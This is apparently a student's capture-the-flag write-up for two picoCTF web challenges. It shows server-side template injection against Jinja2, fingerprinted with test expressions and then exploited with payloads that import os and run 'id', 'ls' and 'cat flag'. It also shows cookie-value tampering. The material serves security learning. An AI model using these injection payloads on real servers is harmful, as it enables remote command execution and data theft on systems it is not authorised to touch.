# 2. SSTI1

I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website here!

HINT: Server Side Template Injection

## Solution:

I searched up Server Side Template Injection on google and started reading up some articles, trying to understand what to do, I found this simple decision tree to figure out the template engine. 

<img width="751" height="397" alt="image" src="https://github.com/user-attachments/assets/7e67a19a-d433-4df2-82ef-20674222e48c" />


Following this, I entered the command ${7*7}, which returned the same text. 

<img width="1361" height="319" alt="image" src="https://github.com/user-attachments/assets/078ece5e-79b3-4b3e-a94b-6da60c5766e7" />


Then I entered {{7*7}}, which gave the following response.

<img width="1361" height="319" alt="image" src="https://github.com/user-attachments/assets/90574f38-fa76-4d8f-b68f-5e0877d48388" />


Finally entering the command {{7*'7'}}, gave this.

**This means that the site is using Jinja2.**


We then need to inject payloads to get our flag, I use the payload 
`{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}`

<img width="1587" height="518" alt="image" src="https://github.com/user-attachments/assets/e74a79c9-8fb0-4db4-8482-4d14cc863603" />

We know that we are running with root access.

Next I list the files present, using the ls command.

`{{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }}`

<img width="1587" height="518" alt="image" src="https://github.com/user-attachments/assets/3f7b7b24-bf85-4c09-82b1-bb11db5424da" />

Printing the file "flag", using `{{ request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}`

<img width="1801" height="395" alt="image" src="https://github.com/user-attachments/assets/0d408847-50d0-4181-b9a6-53d834b853c4" />

We get the final flag.



## Flag:

```

```

## Concepts learnt:

# 3. Cookies

Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:64944/

## Solution:

At the home page of the website, we are given a prompt to enter different kinds of cookies, since "snickerdoodle" is hinted at us, I type it and it takes us to a different page.

Looking at the cookies of the site, there exists only one cookie called "name", whose value is -1 at the home page and 0 on the page where snickerdoodle is entered.

<img width="1806" height="622" alt="image" src="https://github.com/user-attachments/assets/2b1eacb2-7374-4b22-aefd-9275483e6919" />

Seeing this, I try and change the value of the cookie and refresh the page, this gives us different pages with different kinds of cookies. For the value 18, we get the flag.
